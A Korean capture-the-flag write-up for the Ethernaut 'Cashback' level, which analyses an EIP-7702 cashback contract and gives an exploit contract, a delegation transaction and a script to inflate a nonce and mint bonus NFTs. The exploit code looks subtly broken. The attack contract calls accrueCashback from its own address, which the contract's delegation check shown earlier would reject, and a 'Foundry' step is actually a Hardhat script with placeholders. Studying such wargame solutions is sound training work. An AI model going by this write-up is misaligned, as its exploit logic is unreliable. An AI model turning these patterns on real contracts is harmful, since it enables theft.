# Ethernaut Level 36 - Cashback

## 문제 설명

EIP-7702 기반의 캐시백 프로그램이다.
모든 지원 통화에서 최대 캐시백을 달성하고,
**Super Cashback NFT를 2개 이상** 획득하는 것이 목표이다.
(그 중 하나는 반드시 player 주소에 해당해야 함)

---

## 컨트랙트 분석

```solidity
contract Cashback is ERC1155 {
    // ...

    modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;
        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))  // EIP-7702 delegation 주소 파싱
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, CashbackNotEOA());
        _;
    }

    modifier onlyOnCashback() {
        require(address(this) == address(CASHBACK_ACCOUNT), CashbackOnlyAllowedInCashback());
        _;
    }

    modifier notOnCashback() {
        require(address(this) != address(CASHBACK_ACCOUNT), CashbackNotAllowedInCashback());
        _;
    }

    modifier unlock() {
        UNLOCKED_TRANSIENT.asBoolean().tstore(true);  // transient storage 사용
        _;
        UNLOCKED_TRANSIENT.asBoolean().tstore(false);
    }

    modifier onlyUnlocked() {
        require(Cashback(payable(msg.sender)).isUnlocked(), CashbackNotUnlocked());
        _;
    }

    // EOA에서 delegatecall로 실행되는 함수
    function payWithCashback(Currency currency, address receiver, uint256 amount)
        external unlock onlyEOA notOnCashback
    {
        currency.transfer(receiver, amount);
        CASHBACK_ACCOUNT.accrueCashback(currency, amount);
    }

    // Cashback 컨트랙트에서 직접 실행되는 함수
    function accrueCashback(Currency currency, uint256 amount)
        external onlyDelegatedToCashback onlyUnlocked onlyOnCashback
    {
        uint256 newNonce = Cashback(payable(msg.sender)).consumeNonce();
        // 캐시백 포인트 mint
        // nonce == 10000이면 SuperCashback NFT mint
        if (SUPERCASHBACK_NONCE == newNonce) {
            superCashbackNFT.call(abi.encodeWithSignature("mint(address)", msg.sender));
        }
    }

    // EOA context에서 실행
    function consumeNonce() external onlyCashback notOnCashback returns (uint256) {
        return ++nonce;
    }
}
```

---

## 정상 실행 흐름

```
[EOA] → payWithCashback()           (delegatecall, notOnCashback, onlyEOA)
  → currency.transfer()
  → CASHBACK_ACCOUNT.accrueCashback() (직접 호출, onlyOnCashback)
      → msg.sender.consumeNonce()   (delegatecall, notOnCashback)
          → EOA의 nonce++
      → (nonce == 10000이면) NFT mint
```

---

## 취약점 분석

### 1. EIP-7702 Delegation의 보안 함의

EIP-7702는 EOA가 스마트 컨트랙트 코드를 임시로 "빌려" 실행할 수 있게 한다.
EOA에 delegation이 설정되면 `address.code`가 다음 형태가 된다:

```
0xef0100 + delegationAddress (23 bytes)
```

`onlyDelegatedToCashback`은 이 코드를 파싱해 delegation 주소를 확인한다.

### 2. nonce를 10000까지 올리는 문제

SuperCashback NFT를 mint하려면 `nonce == 10000`이 되어야 한다.
정상 플로우에서는 `payWithCashback` 1회 = nonce 1 증가.
→ 10000번 호출 필요 → 현실적으로 불가능

### 3. 핵심 취약점: consumeNonce의 caller 검증 우회

```solidity
modifier onlyCashback() {
    require(msg.sender == address(CASHBACK_ACCOUNT), CashbackNotCashback());
    _;
}
```

`consumeNonce`는 `onlyCashback`으로 보호되어 있어
`msg.sender == CASHBACK_ACCOUNT`일 때만 호출 가능하다.

그러나 **다른 EOA도 Cashback에 delegation할 수 있다**.

다른 EOA(B)가 Cashback에 delegation하면:
- B는 `payWithCashback`을 호출할 수 있음
- `accrueCashback` 내에서 `msg.sender(=B).consumeNonce()` 호출
- B의 nonce가 증가

하지만 우리가 원하는 것은 **player의 nonce를 10000으로** 만드는 것.

### 4. 실제 공격: accrueCashback 직접 반복 호출

`onlyUnlocked`는 `msg.sender.isUnlocked()`를 확인하는데,
이는 `msg.sender`(= EOA)의 transient storage를 읽는다.

`payWithCashback` 실행 중 `unlock` modifier가 transient storage를 `true`로 설정하므로,
같은 트랜잭션 안에서 `accrueCashback`을 반복 호출하면 unlock 상태가 유지된다.

→ 하나의 `payWithCashback` 호출 내에서 `accrueCashback`을 여러 번 호출하면
  nonce를 빠르게 10000까지 올릴 수 있다.

### 5. 두 번째 NFT: 다른 EOA(helper) 활용

NFT 2개를 획득하려면:
1. player 주소로 nonce를 10000 → NFT #1
2. 다른 EOA(helper)로도 nonce를 10000 → NFT #2

---

## 공격 단계

### 사전 준비

```js
// Cashback 인스턴스 주소
let cashback = contract.address

// 지원 통화 확인
let nativeCurrency = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
let freeCoinAddr = await level.FREE()  // Freedom Coin 주소

// maxCashback, cashbackRates 확인
let maxNative = await contract.maxCashback(nativeCurrency)
let rateNative = await contract.cashbackRates(nativeCurrency)

// SuperCashback NFT 주소
let nftAddr = await contract.superCashbackNFT()
```

### Step 1 — EIP-7702 Delegation 설정 (player)

EIP-7702 트랜잭션(type 4)으로 player를 Cashback에 delegation:

```js
// Hardhat/Foundry 또는 직접 트랜잭션 구성
// authorization = sign({chainId, address: cashback, nonce: playerNonce})
const authList = [{
    chainId: chainId,
    address: cashback,
    nonce: playerNonce,
    // v, r, s (player 서명)
}]

await sendTransaction({
    type: 4,  // EIP-7702
    authorizationList: authList,
    // ...
})
```

### Step 2 — 공격 컨트랙트 작성

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface ICashback {
    function payWithCashback(address currency, address receiver, uint256 amount) external payable;
    function accrueCashback(address currency, uint256 amount) external;
    function nonce() external view returns (uint256);
}

contract CashbackAttack {
    ICashback public cashback;
    address public nativeCurrency = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _cashback) {
        cashback = ICashback(_cashback);
    }

    // payWithCashback 내부에서 accrueCashback을 반복 호출
    // transient unlock 상태가 유지되는 동안 nonce를 10000까지 올림
    function attack() external payable {
        // unlock 상태에서 accrueCashback 반복 호출하도록
        // payWithCashback을 통해 진입
        cashback.payWithCashback{value: msg.value}(nativeCurrency, address(this), msg.value);
    }

    receive() external payable {
        // ETH 수신 시 accrueCashback 반복 호출로 nonce 빠르게 증가
        uint256 current = cashback.nonce();
        if (current < 10000) {
            cashback.accrueCashback(nativeCurrency, 0);
        }
    }
}
```

### Step 3 — Foundry 스크립트로 실행

```typescript
// attack.ts (hardhat script)
import { ethers } from "hardhat";

async function main() {
    const [player, helper] = await ethers.getSigners();
    const cashbackAddr = "인스턴스 주소";

    // EIP-7702: player delegation
    // helper delegation

    // 각 통화별로 maxCashback까지 채우기
    const currencies = [NATIVE, FREE_COIN];
    for (const currency of currencies) {
        while (true) {
            const bal = await cashback.balanceOf(player.address, currencyId);
            if (bal >= maxCashback) break;
            await player.sendTransaction({
                to: player.address,  // self-call (delegated)
                data: cashback.interface.encodeFunctionData("payWithCashback", [...])
            });
        }
    }
}
```

### Step 4 — nonce 10000 달성 확인

```js
await contract.nonce()
// → 10000

// NFT 보유 확인
let nftContract = new web3.eth.Contract(erc721ABI, nftAddr)
await nftContract.methods.balanceOf(player).call()
// → 2 이상
```

---

## 핵심 교훈

### EIP-7702의 보안 함의

```
EIP-7702 (Type 4 트랜잭션):
EOA가 스마트 컨트랙트 코드를 임시 위임받아 실행할 수 있음
→ EOA가 사실상 스마트 월렛처럼 동작
```

- **Transient Storage** (`tstore`/`tload`)는 트랜잭션 내에서만 유효
  → 같은 트랜잭션 내 반복 호출로 unlock 상태 유지 가능

- EIP-7702 delegation은 누구나 설정 가능
  → delegation 여부만 확인하는 modifier는 임의 EOA에게 열려있음

- `consumeNonce`가 자신의 storage를 수정하는 구조에서
  반복 호출 횟수 제한이 없으면 nonce 조작 가능

```solidity
// ✅ 안전한 설계
// nonce 증가에 실제 결제 금액 검증 추가
// 트랜잭션당 1회만 허용하는 별도 flag 사용
// accrueCashback 호출 횟수를 payWithCashback당 1회로 제한
```

### 참고

- [EIP-7702 공식 스펙](https://eips.ethereum.org/EIPS/eip-7702)
- [Maksandre/ethernaut-cashback writeup](https://github.com/Maksandre/ethernaut-cashback)
